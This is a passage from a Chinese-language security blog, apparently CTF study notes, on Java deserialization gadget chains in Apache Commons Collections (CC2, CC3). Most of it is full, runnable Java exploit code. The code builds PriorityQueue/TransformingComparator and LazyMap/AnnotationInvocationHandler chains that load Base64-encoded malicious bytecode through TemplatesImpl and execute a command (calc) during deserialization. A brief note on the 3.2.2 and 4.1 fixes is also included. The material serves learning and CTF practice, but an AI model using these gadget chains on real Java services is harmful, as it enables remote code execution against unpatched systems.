class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="comment">// 这里多了一步Comparator的构造</span></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* * * * * * 2. 构造triggerObj * * * * * */</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// 不是最大堆，明显会发生一次比较和交换，这里直接按照逻辑不用一步一步分析代码了(严谨总是好的)</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* * * * * * 3. 正式插入payload * * * * * */</span></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC2-TemplatesImpl-改进poc"><a href="#CC2-TemplatesImpl-改进poc" class="headerlink" title="CC2_TemplatesImpl 改进poc"></a>CC2_TemplatesImpl 改进poc</h3><ol><li>目的也是改进出⽆Transformer数组的利⽤链</li><li><strong>注意点分析</strong><ol><li><p><strong>Q: add(obj)后add(1)为什么不行</strong>: 合理如果改成add(obj)后add(1)应该也是可以的，但是这里不行，总是先调用到transform(1)这是就报错了，调用到transform(obj)的话总是在后</p><ol><li>A: 这里PriorityQueue会对每一次add都调用到比较去到<code>transform()</code>，但是由于这里的fakeTransformer导致调用了<code>toString()</code>，排列后总是1在第一个，如果一定要这样做可以学习ysoserial的做法(但是建议两个obj完事)</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ysoserial solution</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 手动进行设置即可</span></span><br></pre></td></tr></table></figure></li><li><p><strong>InvokerTransformer</strong>: 这条链由于失去了外面的<code>FrAXFilter</code>的包裹，导致需要调用到<code>InvokerTransformer</code>来执行命令，对于有过滤的还是不行</p></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2_p_TemplatesImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytescode() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">byte</span>[]) Base64.decode(<span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getBytescode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(obj);</span><br><span class="line">        queue.add(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CC链之死"><a href="#CC链之死" class="headerlink" title="CC链之死"></a>CC链之死</h3><blockquote><p>CC链的利用只能在于3.2.2之前和4.1之前</p></blockquote><ol><li><p>Apache Commons Collections官⽅在2015年底得知序列化相关的问题后，就在两个分⽀上同时发布了新的版本，4.1和3.2.2</p></li><li><p>p牛原文</p><blockquote><p>先看3.2.2，通过diff可以发现，新版代码中增加了⼀个⽅法 FunctorUtils#checkUnsafeSerialization ，⽤于检测反序列化是否安全。如果开发者没有设置全 局配置 org.apache.commons.collections.enableUnsafeSerialization&#x3D;true ，即默认情况下会 抛出异常。 这个检查在常⻅的危险Transformer类 （ InstantiateTransformer 、 InvokerTransformer 、 PrototypeFactory 、 CloneTransforme r 等）的 readObject ⾥进⾏调⽤，所以，当我们反序列化包含这些对象时就会抛出⼀个异常<br>再看4.1，修复⽅式⼜不⼀样。4.1⾥，这⼏个危险Transformer类不再实现 Serializable 接⼝，也就 是说，他们⼏个彻底⽆法序列化和反序列化了。更绝</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(6)_CC3</title>
      <link href="/2024/11/20/Java%E5%AE%89%E5%85%A85(6)_CC3/"/>
      <url>/2024/11/20/Java%E5%AE%89%E5%85%A85(6)_CC3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>常见的ClassLoader搞了我好久，还是太菜了，第一次学没学扎实</p></blockquote><h2 id="TemplatesImpl与CC1那天喝醉了"><a href="#TemplatesImpl与CC1那天喝醉了" class="headerlink" title="TemplatesImpl与CC1那天喝醉了"></a>TemplatesImpl与CC1那天喝醉了</h2><blockquote><p>下面给出一个CC3半条链的poc，但并不是cc3，用到是cc1中LazyMap这条链</p></blockquote><ol><li>CC1中用到了一个<code>ConstantTransformer</code>，CC1是直接Runtime然后exec</li><li>可以修改为<code>TemplatesImpl</code>，调用<code>newTransformer()</code>进行恶意执行</li><li>其实原理上就是单纯的拼接问题</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HalfCC3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* * * * * * 1. 获取Templ...对象 * * * * * */</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 反射构造调用条件 * * * * * */</span></span><br><span class="line">            <span class="comment">// 0. payload</span></span><br><span class="line">            <span class="type">byte</span>[] payload = Base64.decode(<span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>);</span><br><span class="line">            <span class="comment">// 1. 设置_name</span></span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="comment">// 2. 设置_bytecodes，放入恶意类就好</span></span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;payload&#125;);</span><br><span class="line">            <span class="comment">// 3. 设置_tfactory，非强制，比较慢调用，不会编译错误</span></span><br><span class="line">            <span class="comment">// setFieldValue(triggerObj,&quot;_tfactory&quot;,new TransformerFactoryImpl() );</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 构建转换器 * * * * * */</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="comment">// 这里不使用Runtime了也不需要反射，直接放入一个对象就可以了</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(triggerObj),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span> ,<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">trigger_transformers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 构造lazymap * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,trigger_transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 5. 反射创建我的handler * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">lazyHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class,lazyMap);  <span class="comment">// 这里的Retention是没有作用的，用来占位</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 6. 在readObject时调用invoke * * * * * */</span></span><br><span class="line">            <span class="comment">// 通过动态代理来调用invoke</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">proxyedLazyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),lazyMap.getClass().getInterfaces(),lazyHandler);</span><br><span class="line">            <span class="comment">// AnnotationInvocationHandler就可，有Iterator var4 = this.memberValues.entrySet().iterator();</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class, proxyedLazyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 7. 模拟序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            ois.readObject();    <span class="comment">// 这里如果注释掉不会弹出来计算器，但是要是不注释就会弹，说明正确的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field_name, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field_name);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    